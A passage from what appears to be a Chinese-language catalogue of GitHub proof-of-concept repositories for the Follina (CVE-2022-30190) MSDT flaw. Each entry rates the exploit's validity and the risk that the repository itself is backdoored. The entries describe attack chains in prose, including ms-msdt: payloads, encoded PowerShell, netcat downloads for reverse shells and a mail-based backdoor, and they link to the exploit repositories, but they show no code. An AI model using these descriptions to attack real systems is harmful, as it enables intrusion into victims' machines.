*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
